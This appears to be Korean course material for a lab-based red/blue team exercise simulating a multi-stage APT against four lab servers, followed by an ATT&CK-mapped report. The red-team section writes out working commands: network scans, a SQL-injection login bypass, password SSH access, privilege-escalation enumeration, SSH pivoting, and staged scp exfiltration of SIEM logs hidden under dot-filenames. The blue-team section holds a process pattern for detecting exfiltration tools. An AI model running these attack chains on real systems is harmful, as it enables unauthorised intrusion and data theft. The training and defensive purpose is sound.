# Week 14: 종합 공방전 -- 다단계 APT 시나리오

## 학습 목표
- 다단계 APT(Advanced Persistent Threat) 공격 시나리오(정찰→침투→확산→유출)를 이해하고 실행할 수 있다
- Red Team으로서 Kill Chain 전체를 관통하는 공격 작전을 수행할 수 있다
- Blue Team으로서 각 공격 단계를 탐지→차단→복구하는 다층 방어를 수행할 수 있다
- 횡적 이동(Lateral Movement)의 원리를 이해하고 SSH 피벗 기법을 실습한다
- 데이터 유출(Exfiltration) 시도를 탐지하고 차단하는 방어 기법을 실습한다
- 전체 인프라(4개 서버)를 대상으로 한 종합 공방전을 수행할 수 있다
- ATT&CK 매핑 기반의 종합 보고서를 작성할 수 있다

## 전제 조건
- Week 11~13의 공방전 경험 (1v1, 팀전)
- MITRE ATT&CK Kill Chain 전체 이해
- 인시던트 대응 프로세스 숙달 (Week 09)
- 팀 구성 및 역할 분담 완료 (Week 13)

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | APT 시나리오 브리핑 + 규칙 설명 | 강의 |
| 0:30-0:50 | 횡적 이동 + 데이터 유출 기법/탐지 | 강의 |
| 0:50-1:00 | 휴식 + 최종 준비 | - |
| 1:00-2:20 | 종합 공방전 (80분) | 실습 |
| 2:20-2:30 | 휴식 | - |
| 2:30-3:10 | 결과 분석 + ATT&CK 매핑 | 실습 |
| 3:10-3:40 | Purple Team 토론 + 퀴즈 + 과제 안내 | 토론/퀴즈 |

---

# Part 1: APT 시나리오 브리핑 (30분)

## 1.1 APT(Advanced Persistent Threat)란?

APT는 특정 목표를 대상으로 장기간에 걸쳐 지속적으로 수행되는 고도화된 사이버 공격이다. 일반적인 공격과 달리 다단계(Multi-Stage)로 진행되며, 각 단계가 성공해야 다음 단계로 진행할 수 있다.

**MITRE ATT&CK 전체 Kill Chain:**
```
종합 공방전에서 다루는 전체 ATT&CK 전술 체인:

  [정찰]        TA0043 Reconnaissance
       ↓
  [초기 접근]    TA0001 Initial Access
       ↓
  [실행]        TA0002 Execution
       ↓
  [지속성]      TA0003 Persistence
       ↓
  [권한 상승]    TA0004 Privilege Escalation
       ↓
  [방어 회피]    TA0005 Defense Evasion
       ↓
  [자격 접근]    TA0006 Credential Access
       ↓
  [탐색]        TA0007 Discovery
       ↓
  [횡적 이동]    TA0008 Lateral Movement
       ↓
  [수집]        TA0009 Collection
       ↓
  [유출]        TA0010 Exfiltration
       ↓
  [영향]        TA0040 Impact
```

### APT vs 일반 공격

| 특성 | 일반 공격 | APT |
|------|---------|-----|
| 목표 | 무차별 | 특정 대상 |
| 기간 | 단기 (분~시간) | 장기 (일~월) |
| 단계 | 1~2단계 | 다단계 (7+) |
| 기술 수준 | 중간 | 높음 |
| 도구 | 공개 도구 | 맞춤형/제로데이 |
| 탐지 난이도 | 중간 | 매우 높음 |
| 피해 규모 | 제한적 | 대규모 |

## 1.2 종합 공방전 시나리오

### 공격 시나리오: "Operation Shadow Claw"

```
[APT 시나리오 — Operation Shadow Claw]

목표: siem 서버(10.20.30.100)에서 보안 로그 데이터 유출

단계 1 — 정찰 (10분)
+-- 전체 네트워크 스캔
+-- 서비스 열거
+-- 취약점 매핑

단계 2 — 초기 침투 (15분)
+-- web 서버 웹 취약점 공격 (1차 거점)
+-- 또는 SSH 사전 공격
+-- 셸 획득

단계 3 — 권한 상승 + 지속성 (15분)
+-- SUID/sudo 악용
+-- 백도어 계정/cron 설정
+-- SSH 키 배포

단계 4 — 횡적 이동 (20분)
+-- web → siem SSH 피벗
+-- web → secu 접근 시도
+-- 내부 네트워크 추가 정찰

단계 5 — 데이터 유출 (20분)
+-- siem에서 보안 로그 수집
+-- 데이터 압축/인코딩
+-- 외부(opsclaw)로 유출 시도
```

### 방어 시나리오

```
[Blue Team 방어 목표]

1. 탐지: 각 공격 단계를 가능한 빨리 탐지
2. 차단: 침투 시도를 차단하거나 확산을 방지
3. 격리: 침해 호스트를 즉시 격리
4. 복구: 서비스 가용성을 유지/복원
5. 보고: NIST IR 형식의 사후 보고서 작성
```

## 1.3 횡적 이동(Lateral Movement) 기법

### SSH 피벗

```
[SSH 피벗 — web에서 siem으로]

공격자 (opsclaw)
    |
    | SSH (이미 침투)
    ▼
web 서버 (10.20.30.80)  ← 1차 거점
    |
    | SSH (내부 네트워크)
    ▼
siem 서버 (10.20.30.100) ← 2차 목표

방법 1: SSH 직접 연결
  ssh -J web@10.20.30.80 siem@10.20.30.100

방법 2: SSH 터널
  ssh -L 2222:10.20.30.100:22 web@10.20.30.80
  ssh -p 2222 siem@localhost

방법 3: 프록시체인
  ssh -D 1080 web@10.20.30.80
  proxychains ssh siem@10.20.30.100
```

### 횡적 이동 탐지

| 기법 | 흔적 | 탐지 방법 |
|------|------|---------|
| SSH 피벗 | auth.log에 내부 IP 로그인 | 내부→내부 SSH 모니터링 |
| SSH 터널 | 비정상 포트 바인딩 | `ss -tlnp` 모니터링 |
| 자격증명 재사용 | 같은 계정으로 다중 호스트 접근 | auth.log 상관분석 |
| 포트 포워딩 | 비정상 LISTEN 포트 | `ss` 주기적 확인 |

## 1.4 데이터 유출(Exfiltration) 기법

### 유출 방법 비교

| 방법 | 프로토콜 | 탐지 난이도 | 대역폭 | 예시 |
|------|---------|-----------|--------|------|
| SCP/SFTP | SSH(22) | 중간 | 높음 | `scp file attacker:` |
| HTTP POST | HTTP(80) | 낮음 | 높음 | `curl -X POST -d @file` |
| DNS 터널 | DNS(53) | 높음 | 매우 낮음 | `dnscat2` |
| ICMP 터널 | ICMP | 높음 | 낮음 | `icmptunnel` |
| Base64 인코딩 | 다양 | 중간 | 중간 | 데이터를 텍스트로 변환 |

### 유출 탐지 방법

| 탐지 포인트 | 방법 | 도구 |
|-----------|------|------|
| 비정상 외부 연결 | outbound 연결 모니터링 | `ss -tn`, nftables |
| 대용량 전송 | 트래픽 볼륨 감시 | iftop, nftables counter |
| 비정상 DNS | DNS 쿼리 길이/빈도 | Suricata, tcpdump |
| 인코딩 데이터 | Base64 패턴 감지 | access.log 분석 |

---

# Part 2: 횡적 이동 + 데이터 유출 기법/탐지 (20분)

## 2.1 SSH 피벗 실습 구조

```
[종합 공방전 피벗 맵]

opsclaw (공격 기지)
  |
  +--[SSH]--> web (1차 거점)
  |              |
  |              +--[SSH 피벗]--> siem (최종 목표)
  |              |
  |              +--[SSH 피벗]--> secu (보조 목표)
  |
  +-- 데이터 유출 <-- web <-- siem 데이터
```

## 2.2 유출 차단 전략

```
[유출 차단 계층]

Layer 1: 네트워크 격리
+-- 내부 서버의 외부 outbound 차단 (기본)
+-- 허용된 outbound만 화이트리스트

Layer 2: 트래픽 감시
+-- 대용량 outbound 트래픽 알림
+-- 비정상 프로토콜 탐지

Layer 3: 호스트 감시
+-- 새로운 LISTEN 포트 감시
+-- 프로세스 감시 (scp, curl, nc 등)
+-- 파일 접근 감시 (중요 데이터)
```

---

# Part 3: 종합 공방전 실습 (80분)

## 실습 3.1: Red Team -- 다단계 APT 공격

### Step 1: 정찰 + 초기 침투 (Phase 1~2)

> **실습 목적**: 전체 인프라를 정찰하고 가장 취약한 서버에 초기 침투를 수행한다.
>
> **배우는 것**: APT 킬체인의 정찰→침투 단계, 거점 확보

```bash
# === Red Team: Phase 1-2 — 정찰 + 침투 ===
echo "[$(date +%H:%M:%S)] Operation Shadow Claw 시작"

# Phase 1: 빠른 정찰
echo "[Phase 1] 전체 정찰"
echo 1 | sudo -S nmap -sS -sV -T4 --top-ports 100 \
  10.20.30.1 10.20.30.80 10.20.30.100 \
  -oN /tmp/apt_recon.txt 2>/dev/null
grep "open" /tmp/apt_recon.txt | grep -v "^#" | head -15
echo "정찰 완료"

# Phase 2: web 서버 침투 (가장 취약)
echo ""
echo "[Phase 2] web 서버 침투"

# SQLi 인증 우회
echo "[2a] SQLi 시도"
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' 2>/dev/null | head -c 100
echo ""

# SSH 접근
echo "[2b] SSH 접근"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo 'SHELL: web@$(hostname) ($(whoami))'" 2>/dev/null || echo "SSH 접근 실패"

echo "[$(date +%H:%M:%S)] Phase 1-2 완료"
```

> **결과 해석**:
> - 전체 인프라 정찰로 공격 대상을 식별한다
> - web 서버가 가장 많은 서비스를 노출하므로 1차 거점으로 선택
> - SSH 성공 시 "SHELL" 보고 → Phase 3로 전환
>
> **실전 활용**: APT에서는 가장 약한 고리를 통해 진입한다. web 서버가 공격 표면이 가장 넓으므로 자연스러운 1차 목표이다.
>
> **명령어 해설**:
> - 전체 정찰과 동시에 수동 웹 정찰을 수행하여 시간을 절약한다
>
> **트러블슈팅**:
> - SQLi 실패: JuiceShop이 실행되지 않는 경우 → SSH 공격에 집중
> - SSH 차단: Blue Team이 이미 차단 → 다른 서비스 벡터 시도

### Step 2: 권한 상승 + 횡적 이동 (Phase 3~4)

> **실습 목적**: 1차 거점(web)에서 권한을 상승시키고 다른 서버(siem)로 이동한다.
>
> **배우는 것**: 권한 상승 실전, SSH 피벗, 내부 네트워크 정찰

```bash
# === Red Team: Phase 3-4 — 권한 상승 + 피벗 ===
echo "[$(date +%H:%M:%S)] Phase 3-4 시작"

# Phase 3: 권한 상승 탐색
echo "[Phase 3] 권한 상승"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'PRIVESC'
echo "현재 사용자: $(whoami)"
echo ""
echo "[sudo 확인]"
sudo -l 2>/dev/null | head -10

echo ""
echo "[SUID 확인]"
find / -perm -4000 -type f 2>/dev/null | head -10

echo ""
echo "[내부 네트워크 확인]"
ip addr show | grep "inet " | grep -v 127.0.0.1
echo ""
echo "[내부 호스트 접근 테스트]"
for host in 10.20.30.1 10.20.30.100; do
  timeout 2 bash -c "echo >/dev/tcp/$host/22" 2>/dev/null \
    && echo "  $host:22 OPEN" || echo "  $host:22 closed/filtered"
done
PRIVESC

# Phase 4: 횡적 이동 (web → siem)
echo ""
echo "[Phase 4] 횡적 이동"
echo "[SSH 피벗] web → siem 시도"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   'echo PIVOT: siem@\$(hostname) 접근 성공' 2>/dev/null" 2>/dev/null || \
  echo "피벗 실패: siem 접근 불가"

# secu 서버 접근 시도
echo "[SSH 피벗] web → secu 시도"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
   'echo PIVOT: secu@\$(hostname) 접근 성공' 2>/dev/null" 2>/dev/null || \
  echo "피벗 실패: secu 접근 불가"

echo "[$(date +%H:%M:%S)] Phase 3-4 완료"
```

> **결과 해석**:
> - `sudo -l`: NOPASSWD 항목이 있으면 권한 상승 가능
> - 내부 호스트 22번 포트 OPEN: SSH 피벗 가능
> - 피벗 성공 시 2차 거점(siem 또는 secu) 확보
>
> **실전 활용**: 횡적 이동은 APT의 핵심이다. 1차 거점에서 내부 네트워크를 정찰하고, 최종 목표에 가까운 서버로 이동한다.
>
> **명령어 해설**:
> - `bash -c "echo >/dev/tcp/$host/22"`: nmap 없이 포트 스캔 (Living off the Land)
> - SSH 피벗: web을 경유하여 siem에 SSH 접속
>
> **트러블슈팅**:
> - sshpass 미설치: `ssh-keygen` + 키 배포로 대체
> - 피벗 차단: Blue Team이 내부 SSH를 제한 → 다른 프로토콜 시도

### Step 3: 데이터 수집 + 유출 (Phase 5)

> **실습 목적**: 최종 목표인 siem에서 보안 로그를 수집하고 외부로 유출을 시도한다.
>
> **배우는 것**: 데이터 수집, 압축/인코딩, 유출 경로 선택

```bash
# === Red Team: Phase 5 — 데이터 유출 ===
echo "[$(date +%H:%M:%S)] Phase 5 시작 — 데이터 유출"

# siem에서 보안 로그 수집 (피벗 경유)
echo "[수집] siem 보안 로그"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   'ls -la /var/ossec/logs/ 2>/dev/null | head -10; \
    wc -l /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null" 2>/dev/null || \
  echo "siem 데이터 접근 실패"

# 데이터 압축 (siem에서)
echo "[압축] 데이터 압축"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
   'tar czf /tmp/.data.tar.gz /var/ossec/logs/alerts/ 2>/dev/null && \
    echo 압축 완료: \$(ls -lh /tmp/.data.tar.gz | awk \"{print \\\$5}\")' 2>/dev/null" 2>/dev/null || \
  echo "압축 실패"

# 유출 시도 (siem → web → opsclaw)
echo "[유출] siem → web 전송"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 scp -o StrictHostKeyChecking=no \
   siem@10.20.30.100:/tmp/.data.tar.gz /tmp/.exfil.tar.gz 2>/dev/null && \
   echo '전송 성공: web에 데이터 도착' || echo '전송 실패'" 2>/dev/null

echo "[유출] web → opsclaw 전송"
sshpass -p1 scp -o StrictHostKeyChecking=no \
  web@10.20.30.80:/tmp/.exfil.tar.gz /tmp/exfiltrated.tar.gz 2>/dev/null && \
  echo "유출 성공: $(ls -lh /tmp/exfiltrated.tar.gz 2>/dev/null)" || \
  echo "유출 실패 (차단됨)"

echo "[$(date +%H:%M:%S)] Phase 5 완료 — Operation Shadow Claw 종료"
```

> **결과 해석**:
> - siem의 `/var/ossec/logs/`에 Wazuh 알림 데이터가 있다
> - 데이터를 압축하여 전송 크기를 줄인다 (탐지 회피)
> - 숨겨진 파일명(`.data.tar.gz`)으로 탐지를 어렵게 한다
> - siem→web→opsclaw 경로로 2단계 유출
>
> **실전 활용**: 실제 APT에서도 데이터를 압축/인코딩한 후 다단계 경유지를 거쳐 유출한다.
>
> **명령어 해설**:
> - `tar czf /tmp/.data.tar.gz`: 숨김 파일로 압축 아카이브 생성
> - `scp ... siem:file web:dest`: SSH 기반 파일 전송 (피벗 경유)
>
> **트러블슈팅**:
> - 피벗 실패: 이전 단계에서 siem 접근에 실패한 경우 → web 데이터로 대체
> - outbound 차단: Blue Team이 외부 전송을 차단 → Base64로 텍스트 유출 시도

## 실습 3.2: Blue Team -- 다층 방어

### Step 1: 다층 모니터링 및 탐지

> **실습 목적**: APT의 각 단계를 다층 모니터링으로 탐지한다.
>
> **배우는 것**: 다중 서버 동시 모니터링, 상관분석, 횡적 이동 탐지

```bash
# === Blue Team: 다층 모니터링 ===
echo "[$(date +%H:%M:%S)] Blue Team 다층 모니터링 시작"

# Layer 1: 네트워크 수준 (secu)
echo "[Layer 1] 네트워크 탐지"
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "tail -10 /var/log/suricata/fast.log 2>/dev/null"

# Layer 2: 호스트 수준 (web)
echo ""
echo "[Layer 2] web 서버 탐지"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo '=== SSH 실패 ===' && grep -c 'Failed' /var/log/auth.log 2>/dev/null; \
   echo '=== SSH 성공 ===' && grep 'Accepted' /var/log/auth.log 2>/dev/null | tail -5; \
   echo '=== 현재 연결 ===' && ss -tn 2>/dev/null | head -10"

# Layer 3: 횡적 이동 탐지 (siem)
echo ""
echo "[Layer 3] siem 서버 — 횡적 이동 탐지"
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "echo '=== SSH 로그 ===' && grep -E 'Accepted|Failed' /var/log/auth.log 2>/dev/null | tail -5; \
   echo '=== 의심 연결 ===' && ss -tn 2>/dev/null | grep -v ':443' | head -5"

# Layer 4: 데이터 유출 탐지
echo ""
echo "[Layer 4] 데이터 유출 탐지"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo '=== 최근 생성 파일 ===' && find /tmp -mmin -30 -type f 2>/dev/null; \
   echo '=== 비정상 프로세스 ===' && ps aux 2>/dev/null | grep -E 'scp|curl|nc|base64' | grep -v grep"

echo "[$(date +%H:%M:%S)] 다층 모니터링 완료"
```

> **결과 해석**:
> - Layer 1: 외부에서의 스캔/공격을 IDS로 탐지
> - Layer 2: web 서버의 직접적인 침투 시도를 로그로 탐지
> - Layer 3: 내부에서의 횡적 이동을 siem 로그로 탐지
> - Layer 4: 데이터 준비/전송 활동을 파일/프로세스 감시로 탐지
>
> **실전 활용**: APT는 단일 탐지 소스로는 전체 그림을 볼 수 없다. 다층 모니터링으로 각 단계를 포착해야 한다.
>
> **명령어 해설**:
> - `find /tmp -mmin -30`: 최근 30분 내 생성/수정된 파일 (유출 준비 탐지)
> - `grep -E 'scp|curl|nc|base64'`: 유출에 사용되는 일반적인 도구 탐지
>
> **트러블슈팅**:
> - 횡적 이동이 감지되지 않는 경우: 내부 SSH가 정상 트래픽과 구분 어려움 → 시간/패턴 분석 필요

### Step 2: APT 대응 -- 격리 + 근절

> **실습 목적**: 다단계 침해를 발견했을 때 체계적으로 격리하고 근절한다.
>
> **배우는 것**: 다중 호스트 동시 격리, 피벗 경로 차단, 유출 방지

```bash
# === Blue Team: APT 대응 ===
echo "[$(date +%H:%M:%S)] APT 대응 시작"

# 1. web 서버 외부 통신 차단 (1차 거점 격리)
echo "[격리 1] web 외부 통신 차단"
# sshpass -p1 ssh secu@10.20.30.1 \
#   "echo 1 | sudo -S nft add rule inet filter forward ip saddr 10.20.30.80 ip daddr != 10.20.30.0/24 drop"
echo "(시뮬레이션) web 외부 통신 차단"

# 2. web→siem 피벗 경로 차단
echo "[격리 2] web→siem SSH 차단"
# sshpass -p1 ssh siem@10.20.30.100 \
#   "echo 1 | sudo -S nft add rule inet filter input ip saddr 10.20.30.80 tcp dport 22 drop"
echo "(시뮬레이션) web→siem SSH 차단"

# 3. 공격자 세션 종료
echo "[봉쇄] 의심 세션 종료"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "who 2>/dev/null"

# 4. 유출 데이터 삭제
echo "[근절] 유출 준비 파일 제거"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "find /tmp -name '.*' -newer /tmp -type f 2>/dev/null"
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "find /tmp -name '.*' -newer /tmp -type f 2>/dev/null" 2>/dev/null

# 5. 비밀번호 일괄 변경
echo "[근절] 자격증명 변경"
echo "(시뮬레이션) 모든 서버의 비밀번호 변경"

# 6. 서비스 가용성 확인
echo ""
echo "[복구] 서비스 확인"
for url in "http://10.20.30.80:80/" "http://10.20.30.80:3000/"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$url")
  echo "  $url → $STATUS"
done

echo "[$(date +%H:%M:%S)] APT 대응 완료"
```

> **결과 해석**:
> - 다중 호스트 격리: 1차 거점과 피벗 경로를 동시에 차단
> - 피벗 경로 차단: web→siem SSH를 siem 방화벽에서 차단
> - 유출 파일 삭제: /tmp의 숨겨진 파일 제거
>
> **실전 활용**: APT 대응에서는 단일 호스트 격리로는 부족하다. 모든 침해 경로를 동시에 차단해야 한다.
>
> **명령어 해설**:
> - 다중 서버에 동시에 격리 규칙을 적용해야 한다
> - 피벗 경로를 차단하지 않으면 공격자가 계속 내부에서 활동할 수 있다
>
> **트러블슈팅**:
> - 격리 후 내부 서비스 통신 단절: 필요한 내부 통신은 화이트리스트로 허용

---

# Part 4: 결과 분석 + ATT&CK 매핑 (40분)

## 실습 4.1: ATT&CK 기반 종합 분석

### Step 1: 전체 타임라인 + ATT&CK 매핑

> **실습 목적**: 종합 공방전의 전체 활동을 MITRE ATT&CK에 매핑하여 분석한다.
>
> **배우는 것**: 실전 수준의 ATT&CK 매핑, APT 보고서 작성

```bash
cat << 'REPORT'
=== 종합 공방전 결과 — ATT&CK 매핑 보고서 ===

1. 작전 개요
   작전명: Operation Shadow Claw
   기간: 80분
   Red Team: 3~4인
   Blue Team: 3~4인

2. ATT&CK 매핑

   시간  전술           기법                    결과     Blue 탐지
   -------------------------------------------------------------
   0:02  Reconnaissance T1595.001 Port Scan     성공     O (IDS)
   0:05  Reconnaissance T1592.002 Software      성공     X
   0:10  Initial Access T1190 SQLi              성공     X
   0:12  Initial Access T1110 SSH Brute Force   성공     O (auth.log)
   0:15  Execution      T1059.004 Unix Shell    성공     X
   0:18  Priv Escalation T1548 SUID             시도     X
   0:20  Persistence    T1136 Local Account     시도     O (passwd)
   0:25  Discovery      T1046 Network Scan      성공     X
   0:30  Lateral Move   T1021.004 SSH Pivot     성공     O (siem log)
   0:40  Collection     T1005 Local Data        성공     X
   0:50  Exfiltration   T1041 Over C2 Channel   시도     O (outbound)

3. 탐지 성과
   탐지율:         5/11 = 45%
   평균 탐지 시간:  3분
   차단까지 시간:   15분 (최초 침투 후)
   격리까지 시간:   20분

4. 교훈
   [Red Team]
   - SQLi는 탐지되지 않아 효과적인 초기 접근 벡터
   - SSH 피벗은 auth.log에 흔적이 남아 탐지 위험
   - 데이터 유출 시 outbound 차단이 가장 큰 장벽

   [Blue Team]
   - 웹 공격 탐지 강화 필요 (WAF 또는 access.log 분석)
   - 내부 SSH 모니터링 강화 필요
   - 자동화된 outbound 차단 규칙 필요
   - 탐지~차단 시간 15분 → 5분으로 단축 목표
REPORT
```

> **실전 활용**: 이 보고서는 Week 15에서 최종 보고서의 기초 자료가 된다.

### Step 2: OpsClaw 결과 기록

> **실습 목적**: 종합 공방전 결과를 OpsClaw에 기록한다.
>
> **배우는 것**: OpsClaw를 이용한 APT 시뮬레이션 결과 기록

```bash
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week14-apt-battle","request_text":"종합 공방전 APT 시나리오","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

curl -s -X POST "http://localhost:8000/projects/$PID/completion-report" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "summary": "종합 공방전 완료 — 다단계 APT 시나리오 Operation Shadow Claw",
    "outcome": "success",
    "work_details": [
      "Red: 정찰->침투->권한상승->횡적이동->데이터유출 전체 Kill Chain",
      "Blue: 다층 모니터링->탐지->격리->근절->복구 전체 IR 프로세스",
      "ATT&CK 매핑: 11개 기법, 탐지율 45%",
      "교훈: 웹 공격 탐지, 내부 SSH 모니터링, outbound 차단 강화"
    ]
  }' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'보고서: {d.get(\"status\",\"ok\")}')"
```

---

## 검증 체크리스트
- [ ] APT Kill Chain의 각 단계를 설명하고 ATT&CK 전술에 매핑할 수 있는가
- [ ] SSH 피벗을 이용한 횡적 이동을 수행할 수 있는가
- [ ] 데이터 유출 시도를 수행할 수 있는가 (압축, 인코딩, SCP)
- [ ] 다층 모니터링으로 APT의 각 단계를 탐지할 수 있는가
- [ ] 다중 호스트 동시 격리를 수행할 수 있는가
- [ ] 피벗 경로를 식별하고 차단할 수 있는가
- [ ] outbound 트래픽 모니터링으로 데이터 유출을 탐지할 수 있는가
- [ ] 전체 공방전 결과를 ATT&CK에 매핑하여 보고서를 작성할 수 있는가

## 자가 점검 퀴즈

1. APT 공격이 일반 공격과 다른 특성 5가지를 설명하라.

2. SSH 피벗(-J 옵션)의 동작 원리를 설명하라. 왜 내부 네트워크에서 이 기법이 효과적인가?

3. Blue Team이 횡적 이동을 탐지하기 어려운 이유 3가지와 개선 방안을 설명하라.

4. 데이터 유출에서 DNS 터널링이 탐지하기 어려운 이유를 설명하라.

5. 다층 방어(Defense in Depth)에서 4개 Layer의 역할을 각각 설명하라.

6. APT 대응에서 단일 호스트 격리가 부족한 이유를 설명하라.

7. outbound 트래픽 화이트리스트 방식의 장점과 운영상 어려움을 설명하라.

8. Kill Chain에서 Blue Team이 공격을 차단하기 가장 효과적인 단계는 어디인가?

9. 종합 공방전에서 "탐지율 45%"가 의미하는 바와 개선 방안을 설명하라.

10. 실제 APT 사례(SolarWinds, Log4Shell 등)와 이번 시뮬레이션의 유사점/차이점을 설명하라.

## 과제

### 과제 1: APT 시뮬레이션 보고서 (필수)
- Red/Blue 역할에서 수행한 전체 활동을 시간순으로 정리
- ATT&CK 매핑 (최소 8개 기법)
- 각 단계의 성공/실패 분석과 원인
- Purple Team 관점의 교훈과 개선 권고

### 과제 2: 횡적 이동 탐지 규칙 작성 (선택)
- 내부 SSH 피벗을 탐지하는 Suricata/스크립트 규칙 작성
- 비정상 내부 연결 패턴을 정의하고 탐지 로직 구현
- 오탐률을 최소화하는 튜닝 방법 제안

### 과제 3: 데이터 유출 방지 시스템 설계 (도전)
- DLP(Data Loss Prevention) 시스템의 아키텍처를 설계
- outbound 트래픽 분석, 파일 접근 감시, 인코딩 탐지 포함
- nftables + 스크립트로 프로토타입 구현
